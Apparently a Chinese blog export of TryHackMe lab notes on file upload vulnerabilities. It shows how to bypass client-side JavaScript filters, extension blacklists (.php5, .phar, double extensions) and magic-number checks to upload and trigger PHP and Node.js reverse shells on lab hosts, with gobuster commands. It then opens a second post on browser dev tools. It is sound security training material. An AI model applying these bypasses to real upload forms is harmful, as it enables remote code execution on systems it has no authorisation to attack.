                      alt="image-20220925212329121"
                ></p>
<p>在浏览器中打开给定的目标网址，查看网页源码，可以发现过滤函数为一个外部js脚本，点击该脚本地址 跳转查看过滤函数内容，可以看到是设置了一个白名单机制 只允许图片格式的文件进行上传：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925214225752.png"
                      alt="image-20220925214225752"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925214342018.png"
                      alt="image-20220925214342018"
                ></p>
<p>使用Burpsuite 拦截网站的数据包，由于Burp默认不拦截外部的js脚本，所以先修改Burp的Proxy功能中的options，取消对js文件的不匹配。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925214951749.png"
                      alt="image-20220925214951749"
                ></p>
<p>回到原网站刷新浏览器页面，此时Burp会拦截浏览器加载页面，在Burp中查看服务器的响应消息，将实现过滤功能的脚本注释掉或者删除掉，再重新转发给服务器：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925215525151.png"
                      alt="image-20220925215525151"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925220838729.png"
                      alt="image-20220925220838729"
                ></p>
<p>此时回到原网站 可以进行任意文件上传，将shell文件上传至目标站点，访问网站目录中的shell文件，成功建立反向shell：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925220144576.png"
                      alt="image-20220925220144576"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925222248997.png"
                      alt="image-20220925222248997"
                ></p>
<p>利用该反向shell，在攻击机终端找到flag文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925222502895.png"
                      alt="image-20220925222502895"
                ></p>
<h2 id="绕过服务器端过滤-文件扩展名"><a href="#绕过服务器端过滤-文件扩展名" class="headerlink" title="绕过服务器端过滤: 文件扩展名"></a>绕过服务器端过滤: 文件扩展名</h2><h3 id="理论讲解-3"><a href="#理论讲解-3" class="headerlink" title="理论讲解"></a>理论讲解</h3><p>当过滤设置在服务器端时，比客户端过滤更难绕过，因为你完全看不到代码。</p>
<p>为了绕过服务器端的过滤，我们需要进行很多尝试 弄清楚它的过滤机制，然后才能逐渐组装出一个符合限制条件的payload（有效载荷）。</p>
<p>假设有一个使用 文件扩展名黑名单 作为服务器端过滤器的网站，它的后端代码如下所示：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">//Get the extension</span></span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;name&quot;</span>])[<span class="string">&quot;extension&quot;</span>];</span><br><span class="line">    <span class="comment">//Check the extension against the blacklist -- .php and .phtml</span></span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$extension</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;php&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;phtml&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="literal">NULL</span>:</span><br><span class="line">            <span class="variable">$uploadFail</span> = True;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$uploadFail</span> = False;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>在此实例中，代码正在查找最后一个句点(.)并使用该文件名确认扩展名，这就是我们要绕过的。</p>
<p>这些代码的其他工作方式包括: 搜索文件名中的第一个句点(.)，或者在每个句点(.)后面分割文件名，检查是否有被列入黑名单的扩展名出现。</p>
<p>我们可以看到代码正在过滤掉.php 和.phtml 扩展名,因此，如果我们想要上传一个 PHP 脚本，我们将不得不寻找另一个扩展名。</p>
<p>PHP 的维基百科页面（<a class="link"   href="https://en.wikipedia.org/wiki/PHP%EF%BC%89%E6%8F%90%E4%BE%9B%E4%BA%86%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E7%9A%84%E6%89%A9%E5%B1%95%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8" >https://en.wikipedia.org/wiki/PHP）提供了一些常见的扩展，我们可以尝试使用 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>; 然而，实际上还有很多其他很少使用的扩展，网络服务器仍然可以识别出来，其中包括：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.php3, .php4, .php5, .php7, .phps, .php-s, .pht and .phar</span><br></pre></td></tr></table></figure></div>

<p>其中许多都能绕过过滤器(.php 和.phtml被黑名单过滤拦截) ，但有时候服务器会被配置为 不识别一些扩展名为 PHP 文件，如下例所示:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925225244128.png"
                      alt="image-20220925225244128"
                ></p>
<p>这实际上是 Apache2服务器的默认配置（不识别一些扩展名为 PHP 文件），但是，系统管理员可能已经更改了默认配置（或服务器可能已经过时），所以使用其他可能会被解析成php的文件扩展名 还是值得一试。</p>
<p>最终在本例中，我们发现.phar扩展名能够绕过过滤器，并让我们获得一个shell：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925225925059.png"
                      alt="image-20220925225925059"
                ></p>
<p>让我们看看另一个例子，这次我们将完全黑箱操作:没有后端代码可供参考。</p>
<p>在这个例子中，我们有一个上传表单：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925230255823.png"
                      alt="image-20220925230255823"
                ></p>
<p>我们从完全合法的上传开始，让我们尝试上传spaniel.jpg：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925230346469.png"
                      alt="image-20220925230346469"
                ></p>
<p>这说明 JPEGS 是可以被接受的，我们选择一个肯定会被拒绝的吧：shell.php</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925230539046.png"
                      alt="image-20220925230539046"
                ></p>
<p>通过多次尝试上传不同文件格式 的文件，我们能够大概了解 过滤器会接受什么格式的文件或者会拒绝什么格式的文件，我们发现没有既执行又不被过滤的php shell 文件扩展名。</p>
<p>在前面的示例中，我们看到后端代码使用 pathinfo ()函数 来得到” . “后面的最后几个字符,但是如果它对 略有不同的输入内容 进行过滤时会发生什么呢？</p>
<p>让我们尝试上传一个名为shell.jpg.php的文件，我们已经知道 JPEG 文件能够被接受,如果过滤器只是检查.jpg文件是否在输入内容中的某个地方 那会发生什么呢？</p>
<p>这种过滤器的伪代码可能是这样的:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput</span><br><span class="line">IF STRING &quot;.jpg&quot; IS IN VARIABLE userInput:</span><br><span class="line">    SAVE THE FILE</span><br><span class="line">ELSE:</span><br><span class="line">    RETURN ERROR MESSAGE</span><br><span class="line"></span><br><span class="line">伪代码解读：</span><br><span class="line">接受用户的文件--在变量userInput中保存文件名</span><br><span class="line">如果字符串“ . jpg”在变量userInput中</span><br><span class="line">则保存该文件</span><br><span class="line">否则 返回错误信息</span><br></pre></td></tr></table></figure></div>

<p>当上传shell.jpg.php文件之后，我们得到一个成功的消息。使用浏览器导航到&#x2F;uploads目录下，确认payload（有效载荷）已成功上传:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925232259443.png"
                      alt="image-20220925232259443"
                ></p>
<p>点击这个shell文件，成功建立反向shell：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925232416755.png"
                      alt="image-20220925232416755"
                ></p>
<p>这绝不是一个与文件扩展名相关的上传漏洞的详尽列表。与黑客行为中的所有内容一样，我们也在寻找其他人编写的代码中的缺陷; 这些代码很可能是为手头的任务编写的唯一代码。这是从这个任务中学到的真正重要的一点: 在编程时，有成千上万种不同的方法来实现相同的特性——您的开发必须针对手边的过滤器进行定制。绕过任何类型的服务器端过滤器的关键是枚举并查看哪些是允许的，以及哪些是阻塞的; 然后尝试构建一个有效载荷，以便能够通过过滤器所寻找的条件。</p>
<h3 id="实践操作-3"><a href="#实践操作-3" class="headerlink" title="实践操作"></a>实践操作</h3><p>任务要求：绕过过滤器上传并激活一个 shell，在&#x2F;var&#x2F;www&#x2F;路径下找到flag文件，目标站点为：annex.uploadvulns.thm （tips：在找上传后的shell文件时，网站目录并不总是能够提供索引）</p>
<p>进行目录爆破：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://annex.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925234842112.png"
                      alt="image-20220925234842112"
                ></p>
<p>尝试修改shell文件扩展名进行绕过：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传.jpg.php失败</span><br><span class="line">上传.phar失败</span><br><span class="line">上传.pht失败</span><br><span class="line">上传.php-s失败</span><br><span class="line">上传.phps失败</span><br><span class="line">上传.php7失败</span><br><span class="line">上传.php5成功</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925235117393.png"
                      alt="image-20220925235117393"
                ></p>
<p>使用建立的shell，找到flag文件并查看内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925235249962.png"
                      alt="image-20220925235249962"
                ></p>
<h2 id="绕过服务器端过滤-魔术数字"><a href="#绕过服务器端过滤-魔术数字" class="headerlink" title="绕过服务器端过滤: 魔术数字"></a>绕过服务器端过滤: 魔术数字</h2><h3 id="理论讲解-4"><a href="#理论讲解-4" class="headerlink" title="理论讲解"></a>理论讲解</h3><p>我们已经了解了服务器端的扩展名过滤，接下来了解一下 魔术数字验证作为服务器端过滤器的情况。</p>
<p>如前所述，魔术数字是用作文件的更准确的标识符。文件的魔术数字是一个十六进制字符串，并且总是文件中的第一个元素。了解了这一点，就可以使用魔术数字来验证文件上传，只需读取前几个字节并将它们与白名单或黑名单进行比较即可。请记住，这种技术对于基于 PHP 的 Web 服务器非常有效; 但是，对于其他类型的 Web 服务器，它有时会失败。</p>
<p>让我们来看一个例子，我们现在有一个上传页面:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926000803240.png"
                      alt="image-20220926000803240"
                ></p>
<p>如果我们上传标准的 shell.php 文件，就会得到一个错误，但是上传JPEG文件是可以的，所以让我们尝试添加 JPEG 的魔术数字到我们的shell.php文件的顶部，</p>
<p>查看网站：<a class="link"   href="https://en.wikipedia.org/wiki/List_of_file_signatures" >https://en.wikipedia.org/wiki/List_of_file_signatures <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，这个网站向我们展示了 JPEG 文件的几个魔术数字，选择其中一个即可，如：FF D8 FF DB</p>
<p>我们可以直接把这些数字的 ASCII 表示（ÿØÿÛ）添加到文件的顶部，但是直接使用十六进制表示通常更容易。</p>
<p>在开始之前，让我们使用 Linux file 命令来检查 shell 的文件类型:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926004117605.png"
                      alt="image-20220926004117605"
                ></p>
<p>我们选择的魔术数字是四个字节长度，所以让我们打开反向 shell 脚本，在第一行添加四个随机字符。这些字符并不重要，所以在这个例子中我们用了四个“ A”:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926003240345.png"
                      alt="image-20220926003240345"
                ></p>
<p>保存并退出，使用hexeditor（kali默认已安装）或者其他类似工具打开这个文件，这个工具可以让你以十六进制的形式打开并且编辑shell文件内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926003613598.png"
                      alt="image-20220926003613598"
                ></p>
<p>注意上图红色框中的四个字节: 它们都是41，这是大写的“ A”的十六进制代码–正是我们之前在文件顶部添加的内容，将其更改为我们之前查找到的 JPEG 文件的魔术数字:FF D8 FF DB</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926003936182.png"
                      alt="image-20220926003936182"
                ></p>
<p>现在，如果我们保存并退出文件(Ctrl + x)，我们可以再次使用 file命令，并且可以看到我们已经成功地欺骗了 shell 的 filetype：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926004049542.png"
                      alt="image-20220926004049542"
                ></p>
<p>很好，现在让我们尝试上传修改后的 shell，看看它是否绕过过滤器:</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926004208195.png"
                      alt="image-20220926004208195"
                ></p>
<p>我们绕过了服务器端的魔法数字过滤器，得到了一个反向 shell。</p>
<h3 id="实践操作-4"><a href="#实践操作-4" class="headerlink" title="实践操作"></a>实践操作</h3><p>任务要求：绕过魔术数字过滤器上传一个 shell，找到上传的 shell 的位置并激活它，最后在&#x2F;var&#x2F;www&#x2F;路径下找到并查看flag文件，目标站点为magic.uploadvulns.thm</p>
<p>先对目标站点进行目录爆破：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://magic.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926010048800.png"
                      alt="image-20220926010048800"
                ></p>
<p>上传一个JPEG文件到目标站点，目标站点给的提示信息为 只接收gif文件：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926005811324.png"
                      alt="image-20220926005811324"
                ></p>
<p>修改shell文件（先在php文件的顶部添加AAAAAA六个字符，然后使用 hexeditor 修改AAAAAA对应的十六进制字符为gif文件的魔术数字）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926005329194.png"
                      alt="image-20220926005329194"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926010343653.png"
                      alt="image-20220926010343653"
                ></p>
<p>在攻击机终端设置Netcat监听器，上传文件到目标站点，访问之前爆破得到的目录路径，发现服务器上的索引关闭，因此我们需要输入以下内容激活shell：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://magic.uploadvulns.thm/graphics/shell.php</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926020458363.png"
                      alt="image-20220926020458363"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926020859860.png"
                      alt="image-20220926020859860"
                ></p>
<p>成功建立反向shell，使用命令查找flag文件并查看其中的内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926020634615.png"
                      alt="image-20220926020634615"
                ></p>
<h2 id="示例方法"><a href="#示例方法" class="headerlink" title="示例方法"></a>示例方法</h2><p>我们现在已经看到了各种不同类型的过滤器——客户端和服务器端——以及用于文件上传攻击的一般方法。在下一个任务中，你将要完成一个黑盒文件上传挑战，因此让我们借此机会讨论一个示例方法，以便更深入地处理此类挑战。你可以开发自己的方法来替代这种方法，但是，如果你是文件上传攻击的新手，你可能会发现以下示例方法非常有用。</p>
<p>我们把这看作是一个循序渐进的过程，假设我们有一个网站要进行安全审计。</p>
<ol>
<li><p>我们要做的第一件事就是把网站作为一个整体来看。使用浏览器扩展插件，比如前面提到的 Wappalyzer(或者手动) ，我们可以寻找到 Web 应用程序可能使用了什么语言和框架。 Wappalyzer并不总是100% 准确，通过向网站发出请求来手动枚举这些信息是一个很好的开始，同时可以使用 Burpsuite来截取响应消息。消息头中的server或者x-powered-by可用于获取有关服务器的信息，我们还要寻找攻击的载体，比如，一个上传页面。</p>
</li>
<li><p>找到一个上传页面之后，我们的目标是进一步检查它。查看客户端脚本的源代码，以确定是否有任何要绕过的客户端过滤器，客户端完全在我们的控制之中。</p>
</li>
<li><p>然后我们会尝试上传一个完全无害的文件。从这里我们将看到如何才能访问我们的文件，换句话说，我们可以直接在上传文件夹中访问它吗？上传的文件是不是嵌在某个页面里了？网站对所上传的文件的命名方案是什么？如果上传之后，文件所在的位置不是很明显，就需要使用Gobuster 这样的目录扫描工具。这一步非常重要，因为它不仅提高了我们对正在攻击的目标的认识，还给了我们一个“可接受”文件的基准，我们可以在此基础上做进一步测试。</p>
<p>gobuster在这里的一个常用参数选项是-x 选项，该选项可用来查找具有特定扩展名的文件，例如，如果将 -x php，txt，html 添加到 gobuster 命令中，则该工具将附加.php，.txt和.html到选定的字典内容中的每一项。如果你已经设法上传了一个有效负载，并且服务器会更改上传文件的名称，那么这将非常有用。</p>
</li>
<li><p>确定了如何以及在哪里可以访问我们上传的文件之后，我们将尝试进行恶意文件上传，绕过我们在第二步中发现的任何客户端过滤器。如果此时存在服务器端过滤器使文件上传停止，那么它给我们的报错消息对于确定接下来的步骤非常有用。</p>
</li>
</ol>
<p>假设我们的恶意文件上传操作已经被服务器端过滤所停止，以下有一些方法可以确定服务器端使用的是哪种类型的过滤:</p>
<ol>
<li><p>如果你可以成功地上传一个文件扩展名完全无效的文件（<code>testingimage.invalidfileextension</code>)，服务器很可能使用了”扩展名黑名单”来过滤文件，反之，如果该上传失败，那么服务器可能使用的是”扩展名白名单”的方式过滤文件。</p>
</li>
<li><p>尝试重新上传最初被接受的完全无害文件，但这一次将该文件的魔术数字修改为shell文件类型（如php类型）的魔术数字。如果上传失败，那么说明服务器正在使用一个基于魔术数字验证的过滤器。</p>
</li>
<li><p>与前一点一样，再次尝试上传无害的文件，但是使用 BurpSuite 拦截请求，并将上传的 MIME 类型更改为你希望通过过滤的MIME类型。如果上传失败，那么说明服务器端是基于 MIME 类型验证进行过滤的。</p>
</li>
<li><p>枚举服务器端是否存在文件长度过滤，就是上传一个小文件，然后逐渐上传更大的文件，直到你触发了过滤器。到那时你就会知道可接受的极限文件大小是多少。如果你非常幸运，那么第一次上传失败的错误信息可能会直接告诉你文件大小限制是多少。请注意，一个小的文件长度限制可能会阻止你上传shell文件—-比如：到目前为止我们一直在使用的反向 shell文件。</p>
</li>
</ol>
<h2 id="挑战任务"><a href="#挑战任务" class="headerlink" title="挑战任务"></a>挑战任务</h2><p>要求：目标站点为 jewel.uploadvulns.thm ，上传文件并建立反向shell，利用反向shell界面 找到&#x2F;var&#x2F;www&#x2F;路径下的flag文件并查看其内容。</p>
<p>tips：</p>
<p>这里需要一个字典 UploadVulnsWordlist.txt，由TryHackme网页提供下载。</p>
<p>还需要使用github上的nodejs反向shell，地址如下（访问该地址复制前面的function部分）：<br><a class="link"   href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs" >https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>我们需要的shell文件内容如下所示（已经将ip和端口修改好了）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926230004608.png"
                      alt="image-20220926230004608"
                ></p>
<p>首先对目标站点进行目录爆破：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://jewel.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926211905094.png"
                      alt="image-20220926211905094"
                ></p>
<blockquote>
<p>扫描发现四个目录： &#x2F;content	&#x2F;modules	&#x2F;admin	&#x2F;assets    </p>
</blockquote>
<p>在浏览器中访问目标站点查看其网站源代码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926210849782.png"
                      alt="image-20220926210849782"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926211005676.png"
                      alt="image-20220926211005676"
                ></p>
<blockquote>
<p>由过滤脚本可知：客户端存在三种过滤，验证文件大小、验证魔术数字、验证文件扩展名</p>
</blockquote>
<p>使用Wappalyzer浏览器插件检测到该网站属于nodejs站点，所以需要一个nodejs反向shell文件（前文已经给出下载链接）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926213700914.png"
                      alt="image-20220926213700914"
                ></p>
<p>对该shell文件进行修改以便能够绕过一些过滤：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">打开shell文件，在其内容的顶部添加AAA（占位用），</span><br><span class="line">使用hexeditor工具，将AAA对应的十六进制数值改为jpg文件对应的魔术数字的前三位十六进制值FF D8 FF（对应的ASCII码为ÿØÿ）--因为js过滤器中的代码只检测了前三位</span><br><span class="line">修改文件名为shell.jpg</span><br><span class="line">查看文件的大小是否超过文件大小过滤器的限定值</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926230711555.png"
                      alt="image-20220926230711555"
                ></p>
<p>进行文件上传操作，打开Burpsuite拦截该上传,因为shell的内容中添加了多余的魔术数字，所以为了使shell文件能被激活，最终还需要删除这些字符，php的shell文件不需要这一步操作—-因为魔术数字能被添加在php的开始标志”&lt;?php”之外。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926220220577.png"
                      alt="image-20220926220220577"
                ></p>
<blockquote>
<p>通过Burpsuite拦截到的内容，我们可以看到目标站点对文件内容进行了base64编码。</p>
<p>对nodejs的反向shell文件内容进行base64编码，替换掉Burpsuite中的编码内容，然后再点击”Forward”，将该请求消息转发给服务器端。</p>
<p>其实删除掉&#x2F;9j&#x2F;就行，这几个字符是jpg魔术数字前三位对应的ASCII码（前三位ÿØÿ）的base64编码。</p>
</blockquote>
<p>尝试访问之前爆破得到的目录，发现只有一个目录可以访问，即：&#x2F;admin ，根据页面提示 我们需要找到要访问的具体文件路径，然后输入到下图中的输入框中：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926221954657.png"
                      alt="image-20220926221954657"
                ></p>
<p>我们要找的是jpg格式的文件路径，所以我们先看一下网站原有图片的路径：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220926223445601.png"
                      alt="image-20220926223445601"
                ></p>
<blockquote>
<p>从上图可以看到网站原有的图片在&#x2F;content目录下</p>
</blockquote>
<p>现在使用TryHackme提供的字典进行目录爆破 指定目录为&#x2F;content 并指定文件格式为.jpg，尝试找到我们已经上传的shell文件，因为之前检测过shell文件的大小，所以我们找size在400左右的jpg文件进行访问：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://jewel.uploadvulns.thm/content -w ./UploadVulnsWordlist.txt -x .jpg</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927000530281.png"
                      alt="image-20220927000530281"
                ></p>
<p>在攻击机终端使用Netcat建立监听器，在目标站点下&#x2F;admin页面中的输入框中输入..&#x2F;content&#x2F;xxx.jpg ，建立反向shell，使用该shell界面查找flag文件并查看其内容：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927001020219.png"
                      alt="image-20220927001020219"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927001046177.png"
                      alt="image-20220927001046177"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927003006447.png"
                      alt="image-20220927003006447"
                ></p>
<h2 id="恢复hosts文件配置"><a href="#恢复hosts文件配置" class="headerlink" title="恢复hosts文件配置"></a>恢复hosts文件配置</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">在完成练习之后，需要恢复在第一节中对hosts文件所做的修改。</span><br><span class="line"></span><br><span class="line">在Linux或MacOS上，使用以下命令:</span><br><span class="line">sudo sed -i &#x27;$d&#x27; /etc/hosts        #该行命令的意思是：删除文本的最后一列 也就是说把之前在第一节中添加的那一行记录删除。</span><br><span class="line"></span><br><span class="line">在Windows上使用以下命令:</span><br><span class="line">(GC C:\Windows\System32\drivers\etc\hosts | select -Skiplast 1) | SC C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927003603556.png"
                      alt="image-20220927003603556"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927003620151.png"
                      alt="image-20220927003620151"
                ></p>
<h2 id="关卡完整答案"><a href="#关卡完整答案" class="headerlink" title="关卡完整答案"></a>关卡完整答案</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924190030075.png"
                      alt="image-20220924190030075"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220924213350439.png"
                      alt="image-20220924213350439"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925222528104.png"
                      alt="image-20220925222528104"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220925235324298.png"
                      alt="image-20220925235324298"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20220927003325771.png"
                      alt="image-20220927003325771"
                ></p>
]]></content>
      <categories>
        <category>TryHackMe笔记</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>THM-Walking An Application(遍历web应用程序)-学习</title>
    <url>/2024/01/27/THM-Walking%20An%20Application(%E9%81%8D%E5%8E%86web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)-%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>本文相关的TryHackMe实验房间链接：<a class="link"   href="https://tryhackme.com/room/walkinganapplication" >https://tryhackme.com/room/walkinganapplication <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>通过学习相关知识点：仅使用你的浏览器开发工具手动检查 Web 应用程序的安全问题，仅使用你的浏览器进行攻击，而无需工具或脚本。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在本文中，你将学习如何仅使用浏览器中的内置工具手动检查 Web 应用程序的安全问题。 通常情况下，自动化安全工具和脚本会遗漏许多潜在的漏洞和有用的信息。</p>
<p>以下是你将在本文中使用的浏览器内置工具的简要分类：</p>
<ul>
<li><strong>View Source</strong> - 查看源代码 - 使用你的浏览器查看网站页面的人工可读源代码。</li>
<li><strong>Inspector</strong> - 检查器 - 了解如何检查网站页面元素并进行更改以便查看通常会被阻止的内容。</li>
<li><strong>Debugger</strong> - 调试器 - 检查和控制网站页面 JavaScript 的流程</li>
<li><strong>Network</strong> - 网络 - 查看网站页面发出的所有网络请求。</li>
</ul>
<p>在此知识点对应的TryHackMe房间内启动目标虚拟机，等待 2 分钟，然后访问以下 URL：<a class="link"   href="https://lab_web_url.p.thmlabs.com(此/" >https://LAB_WEB_URL.p.thmlabs.com（此 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> URL 将在你启动目标机的 2 分钟后更新）</p>
<h2 id="探索目标网站"><a href="#探索目标网站" class="headerlink" title="探索目标网站"></a>探索目标网站</h2><p>作为渗透测试人员，你在审查网站或 Web 应用程序时的职责是发现可能存在漏洞的功能并尝试利用，以此来评估它们是否存在漏洞。 这些功能通常是网站的一部分，需要与用户进行一些交互。</p>
<p>查找网站的交互部分就像发现登录表单然后手动查看网站的 JavaScript 一样简单。 一个很好的起点是使用你的浏览器访问目标网站，了解该网站的各个页面&#x2F;区域&#x2F;功能，并为每个页面&#x2F;区域&#x2F;功能做简单的信息记录。</p>
<p>Acme IT Support 示例站点的审查如下所示：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../articleimg/image-20221111232410243.png"
                      alt="image-20221111232410243"
                ></p>
